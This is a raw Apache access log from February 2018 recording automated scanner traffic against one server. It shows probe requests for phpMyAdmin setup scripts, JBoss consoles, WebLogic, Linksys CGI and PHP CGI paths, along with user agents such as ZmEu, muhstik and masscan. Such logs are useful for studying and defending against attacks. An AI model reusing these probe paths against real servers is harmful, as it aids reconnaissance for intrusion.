82.102.149.69 - - [05/Feb/2018:21:43:03 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
82.102.149.69 - - [05/Feb/2018:21:43:05 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
107.170.235.55 - - [05/Feb/2018:22:53:34 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
201.221.239.61 - - [05/Feb/2018:23:02:55 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik/1.0"
201.221.239.61 - - [05/Feb/2018:23:02:56 -0500] "GET /webdav HTTP/1.0" 404 204 "-" "muhstik-scan/1.0"
201.221.239.61 - - [05/Feb/2018:23:02:59 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
201.221.239.61 - - [05/Feb/2018:23:02:59 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
213.202.230.144 - - [06/Feb/2018:00:08:54 -0500] "\x03" 400 226 "-" "-"
196.52.43.89 - - [06/Feb/2018:03:30:29 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
8.28.16.254 - - [06/Feb/2018:05:31:42 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
197.248.25.222 - - [06/Feb/2018:05:31:43 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
197.248.25.222 - - [06/Feb/2018:05:31:59 -0500] "GET /favicon.ico HTTP/1.1" 200 - "http://62.12.115.75/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
60.191.38.77 - - [06/Feb/2018:06:11:16 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
60.191.38.77 - - [06/Feb/2018:06:11:17 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
191.96.249.136 - - [06/Feb/2018:06:12:09 -0500] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 226 "-" "-"
172.104.108.109 - - [06/Feb/2018:08:53:43 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0"
128.199.118.50 - - [06/Feb/2018:09:04:25 -0500] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 239 "-" "ZmEu"
128.199.118.50 - - [06/Feb/2018:09:04:25 -0500] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 226 "-" "ZmEu"
128.199.118.50 - - [06/Feb/2018:09:04:26 -0500] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 226 "-" "ZmEu"
128.199.118.50 - - [06/Feb/2018:09:04:27 -0500] "GET /pma/scripts/setup.php HTTP/1.1" 404 219 "-" "ZmEu"
128.199.118.50 - - [06/Feb/2018:09:04:27 -0500] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 223 "-" "ZmEu"
128.199.118.50 - - [06/Feb/2018:09:04:28 -0500] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 223 "-" "ZmEu"
61.240.145.4 - - [06/Feb/2018:09:08:14 -0500] "GET /cgi/online.asp?hostname=[WIN-X6HF63]&httptype=[1][not%20httptunnel] HTTP/1.1" 404 212 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
63.246.129.99 - - [06/Feb/2018:09:30:38 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 - "-" "Mozilla/5.0"
58.48.31.123 - - [06/Feb/2018:16:54:27 -0500] "GET / HTTP/1.0" 200 2321 "-" "-"
54.204.145.199 - - [06/Feb/2018:17:23:51 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/56.0.3102.61 Safari/537.32"
54.169.28.4 - - [06/Feb/2018:21:35:53 -0500] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 226 "-" "python-requests/2.18.4"
89.200.177.148 - - [06/Feb/2018:22:14:09 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik/1.0"
89.200.177.148 - - [06/Feb/2018:22:14:10 -0500] "GET /webdav HTTP/1.0" 404 204 "-" "muhstik-scan/1.0"
89.200.177.148 - - [06/Feb/2018:22:14:13 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
89.200.177.148 - - [06/Feb/2018:22:14:14 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
63.246.129.99 - - [06/Feb/2018:22:39:55 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 - "-" "Mozilla/5.0"
209.126.136.4 - - [06/Feb/2018:22:50:35 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
66.118.142.165 - - [06/Feb/2018:23:56:03 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
60.191.38.77 - - [07/Feb/2018:09:41:34 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
199.116.173.196 - - [07/Feb/2018:10:49:43 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
156.0.232.255 - - [07/Feb/2018:10:49:45 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
156.0.232.255 - - [07/Feb/2018:10:49:46 -0500] "GET /favicon.ico HTTP/1.1" 304 - "http://62.12.115.75/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
156.0.232.255 - - [07/Feb/2018:10:49:49 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
156.0.232.255 - - [07/Feb/2018:10:49:54 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
156.0.232.255 - - [07/Feb/2018:10:49:55 -0500] "GET /favicon.ico HTTP/1.1" 200 - "http://62.12.115.75/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
156.0.232.255 - - [07/Feb/2018:10:57:26 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
78.129.130.48 - - [07/Feb/2018:12:15:56 -0500] "GET /xmlrpc.php HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"
66.118.142.165 - - [07/Feb/2018:13:11:37 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
66.118.142.165 - - [07/Feb/2018:16:09:28 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
94.46.186.49 - - [07/Feb/2018:18:40:21 -0500] "GET /muieblackcat HTTP/1.1" 404 210 "-" "-"
94.46.186.49 - - [07/Feb/2018:18:40:21 -0500] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 226 "-" "-"
94.46.186.49 - - [07/Feb/2018:18:40:21 -0500] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 226 "-" "-"
94.46.186.49 - - [07/Feb/2018:18:40:22 -0500] "GET //pma/scripts/setup.php HTTP/1.1" 404 219 "-" "-"
94.46.186.49 - - [07/Feb/2018:18:40:22 -0500] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 223 "-" "-"
94.46.186.49 - - [07/Feb/2018:18:40:22 -0500] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 223 "-" "-"
125.71.206.132 - - [08/Feb/2018:01:56:08 -0500] "GET / HTTP/1.0" 200 2321 "-" "-"
106.114.63.14 - - [08/Feb/2018:01:56:51 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"
66.118.142.165 - - [08/Feb/2018:02:33:02 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
71.6.202.198 - - [08/Feb/2018:02:54:52 -0500] "GET /ccvv HTTP/1.1" 404 202 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
196.2.148.17 - - [08/Feb/2018:05:15:06 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:07 -0500] "HEAD / HTTP/1.0" 200 - "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:08 -0500] "GET /github.com/joaomatosf/jexboss HTTP/1.0" 404 227 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:08 -0500] "HEAD /web-console/Invoker HTTP/1.0" 404 - "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:08 -0500] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.0" 404 - "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:16 -0500] "GET /manager/html HTTP/1.0" 404 210 "-" "Python-urllib/2.7"
196.2.148.17 - - [08/Feb/2018:05:15:18 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:18 -0500] "POST /axis2/axis2-admin/login HTTP/1.0" 404 221 "-" "Python-urllib/2.7"
196.2.148.17 - - [08/Feb/2018:05:15:23 -0500] "HEAD /invoker/JMXInvokerServlet HTTP/1.0" 404 - "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:23 -0500] "HEAD /admin-console/ HTTP/1.0" 404 - "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)"
196.2.148.17 - - [08/Feb/2018:05:15:24 -0500] "POST / HTTP/1.0" 405 354435 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
196.2.148.17 - - [08/Feb/2018:05:15:25 -0500] "POST / HTTP/1.0" 405 355266 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
196.2.148.17 - - [08/Feb/2018:05:15:25 -0500] "POST / HTTP/1.0" 405 353717 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
196.2.148.17 - - [08/Feb/2018:05:15:26 -0500] "POST / HTTP/1.0" 405 353046 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
188.166.179.156 - - [08/Feb/2018:05:28:45 -0500] "HEAD /template/default/images/logo.png HTTP/1.1" 400 226 "-" "-"
188.226.191.66 - - [08/Feb/2018:07:18:48 -0500] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 239 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:49 -0500] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 226 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:49 -0500] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 226 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:49 -0500] "GET /pma/scripts/setup.php HTTP/1.1" 404 219 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:50 -0500] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 223 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:50 -0500] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 223 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:50 -0500] "GET /db/scripts/setup.php HTTP/1.1" 404 218 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:51 -0500] "GET /mysql/scripts/setup.php HTTP/1.1" 404 221 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:51 -0500] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 226 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:51 -0500] "GET /scripts/setup.php HTTP/1.1" 404 215 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:52 -0500] "GET /admin/scripts/setup.php HTTP/1.1" 404 221 "-" "ZmEu"
188.226.191.66 - - [08/Feb/2018:07:18:52 -0500] "GET /admin/pma/scripts/setup.php HTTP/1.1" 404 225 "-" "ZmEu"
::1 - - [08/Feb/2018:07:18:53 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/7.0.27 (internal dummy connection)"
139.162.108.53 - - [08/Feb/2018:09:56:13 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
60.191.38.78 - - [08/Feb/2018:13:15:18 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
188.166.179.156 - - [08/Feb/2018:13:25:46 -0500] "HEAD /template/default/images/logo.png HTTP/1.1" 400 226 "-" "-"
66.118.142.165 - - [08/Feb/2018:14:35:38 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
60.191.38.77 - - [08/Feb/2018:17:33:42 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
139.162.108.53 - - [08/Feb/2018:20:45:42 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
107.170.255.71 - - [09/Feb/2018:00:07:06 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
66.118.142.165 - - [09/Feb/2018:01:48:02 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
172.104.108.109 - - [09/Feb/2018:01:59:35 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0"
107.170.226.204 - - [09/Feb/2018:02:37:12 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
196.52.43.59 - - [09/Feb/2018:03:59:35 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
188.166.179.156 - - [09/Feb/2018:06:26:31 -0500] "HEAD /template/default/images/logo.png HTTP/1.1" 400 226 "-" "-"
107.6.169.250 - - [09/Feb/2018:10:43:45 -0500] "SSH-2.0-Go" 400 226 "-" "-"
107.6.169.254 - - [09/Feb/2018:10:43:48 -0500] "\x16\x03\x01" 400 226 "-" "-"
107.6.169.252 - - [09/Feb/2018:10:43:49 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
66.118.142.165 - - [09/Feb/2018:12:10:33 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
188.166.179.156 - - [09/Feb/2018:14:28:05 -0500] "HEAD /template/default/images/logo.png HTTP/1.1" 400 226 "-" "-"
66.118.142.165 - - [09/Feb/2018:16:28:09 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
94.102.49.193 - - [09/Feb/2018:17:14:26 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
94.102.49.193 - - [09/Feb/2018:17:14:32 -0500] "GET /robots.txt HTTP/1.1" 200 24 "-" "-"
94.102.49.193 - - [09/Feb/2018:17:14:48 -0500] "GET /favicon.ico HTTP/1.1" 200 - "-" "python-requests/2.10.0"
52.174.52.33 - - [09/Feb/2018:17:15:47 -0500] "GET / HTTP/1.0" 200 2321 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
189.103.164.195 - - [09/Feb/2018:20:11:28 -0500] "GET /hndUnblock.cgi HTTP/1.1" 404 212 "-" "Wget(linux)"
189.103.164.195 - - [09/Feb/2018:20:11:31 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 211 "-" "Wget(linux)"
189.103.164.195 - - [09/Feb/2018:20:11:34 -0500] "GET /moo HTTP/1.1" 404 201 "-" "Wget(linux)"
189.103.164.195 - - [09/Feb/2018:20:11:37 -0500] "GET / HTTP/1.1" 200 2321 "-" "Wget(linux)"
189.103.164.195 - - [09/Feb/2018:20:11:42 -0500] "POST /getcfg.php HTTP/1.1" 404 208 "-" "Wget(linux)"
189.103.164.195 - - [09/Feb/2018:20:11:48 -0500] "POST /getcfg.php HTTP/1.1" 404 208 "-" "Wget(linux)"
185.222.210.29 - - [10/Feb/2018:03:08:58 -0500] "PROPFIND / HTTP/1.1" 405 340113 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:12 -0500] "GET /cgi-bin/php HTTP/1.1" 404 209 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:12 -0500] "GET /cgi-bin/php5 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:13 -0500] "GET /cgi-bin/php-cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:13 -0500] "GET /cgi-bin/php.cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:13 -0500] "GET /cgi-bin/php4 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:13 -0500] "GET /cgi-bin/php5-cli HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:13 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [10/Feb/2018:04:58:13 -0500] "GET /cgi-sys/php5 HTTP/1.1" 404 210 "-" "-"
190.94.141.76 - - [10/Feb/2018:07:45:00 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik/1.0"
190.94.141.76 - - [10/Feb/2018:07:45:01 -0500] "GET /webdav HTTP/1.0" 404 204 "-" "muhstik-scan/1.0"
190.94.141.76 - - [10/Feb/2018:07:45:04 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
190.94.141.76 - - [10/Feb/2018:07:45:05 -0500] "GET / HTTP/1.0" 200 2321 "-" "muhstik-scan"
66.118.142.165 - - [10/Feb/2018:08:11:38 -0500] "HEAD /myadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
164.52.24.140 - - [10/Feb/2018:14:09:32 -0500] "\x16\x03\x01\x01\"\x01" 400 226 "-" "-"
164.52.24.140 - - [10/Feb/2018:14:09:40 -0500] "USER test +iw test :Test Wuz Here" 400 226 "-" "-"
164.52.24.140 - - [10/Feb/2018:14:09:41 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
79.143.188.130 - - [10/Feb/2018:16:53:26 -0500] "GET /cgi-bin/php HTTP/1.1" 404 209 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:26 -0500] "GET /cgi-bin/php5 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:26 -0500] "GET /cgi-bin/php-cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:26 -0500] "GET /cgi-bin/php.cgi HTTP/1.1" 404 213 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:26 -0500] "GET /cgi-bin/php4 HTTP/1.1" 404 210 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:26 -0500] "GET /cgi-bin/php5-cli HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:27 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 214 "-" "-"
79.143.188.130 - - [10/Feb/2018:16:53:27 -0500] "GET /cgi-sys/php5 HTTP/1.1" 404 210 "-" "-"
66.118.142.165 - - [10/Feb/2018:17:41:09 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
185.130.212.128 - - [10/Feb/2018:19:09:58 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
60.191.38.77 - - [10/Feb/2018:22:15:36 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
172.104.108.109 - - [10/Feb/2018:22:18:58 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0"
106.14.114.80 - - [11/Feb/2018:03:47:51 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:47:51 -0500] "HEAD / HTTP/1.0" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:47:52 -0500] "GET /github.com/joaomatosf/jexboss HTTP/1.0" 404 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:47:52 -0500] "HEAD /web-console/Invoker HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:47:53 -0500] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:48:00 -0500] "GET /manager/html HTTP/1.0" 404 210 "-" "Python-urllib/2.7"
106.14.114.80 - - [11/Feb/2018:03:48:03 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:48:08 -0500] "POST /axis2/axis2-admin/login HTTP/1.0" 404 221 "-" "Python-urllib/2.7"
106.14.114.80 - - [11/Feb/2018:03:48:13 -0500] "HEAD /invoker/JMXInvokerServlet HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:48:13 -0500] "HEAD /admin-console/ HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
106.14.114.80 - - [11/Feb/2018:03:48:13 -0500] "-" 408 - "-" "-"
106.14.114.80 - - [11/Feb/2018:03:48:14 -0500] "POST / HTTP/1.0" 405 354492 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
106.14.114.80 - - [11/Feb/2018:03:48:17 -0500] "POST / HTTP/1.0" 405 355304 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
106.14.114.80 - - [11/Feb/2018:03:48:19 -0500] "POST / HTTP/1.0" 405 353751 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
106.14.114.80 - - [11/Feb/2018:03:48:22 -0500] "POST / HTTP/1.0" 405 353089 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
106.14.114.80 - - [11/Feb/2018:03:48:25 -0500] "POST / HTTP/1.0" 405 354469 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.14.114.80 - - [11/Feb/2018:03:48:29 -0500] "POST / HTTP/1.0" 405 355281 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.14.114.80 - - [11/Feb/2018:03:48:31 -0500] "POST / HTTP/1.0" 405 353721 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.14.114.80 - - [11/Feb/2018:03:48:33 -0500] "POST / HTTP/1.0" 405 353072 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
66.118.142.165 - - [11/Feb/2018:05:10:52 -0500] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.0" 404 - "-" "-"
46.183.216.142 - - [11/Feb/2018:05:53:36 -0500] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 239 "-" "ZmEu"
46.183.216.142 - - [11/Feb/2018:05:53:42 -0500] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 226 "-" "ZmEu"
46.183.216.142 - - [11/Feb/2018:05:54:20 -0500] "GET /phpMyAdmin-2.11.11/scripts/setup.php HTTP/1.1" 404 234 "-" "ZmEu"
46.183.216.142 - - [11/Feb/2018:05:54:24 -0500] "GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php HTTP/1.1" 404 248 "-" "ZmEu"
46.183.216.142 - - [11/Feb/2018:05:54:24 -0500] "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 223 "-" "ZmEu"
71.6.142.85 - - [11/Feb/2018:06:07:20 -0500] "GET / HTTP/1.1" 200 2321 "-" "Mozilla/5.0 zgrab/0.x"
101.200.202.228 - - [11/Feb/2018:08:53:27 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:53:28 -0500] "HEAD / HTTP/1.0" 200 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:53:38 -0500] "GET /github.com/joaomatosf/jexboss HTTP/1.0" 404 227 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:53:39 -0500] "HEAD /web-console/Invoker HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:53:40 -0500] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.0" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
101.200.202.228 - - [11/Feb/2018:08:53:48 -0500] "GET /manager/html HTTP/1.0" 404 210 "-" "Python-urllib/2.7"
101.200.202.228 - - [11/Feb/2018:08:53:59 -0500] "GET / HTTP/1.0" 200 2321 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
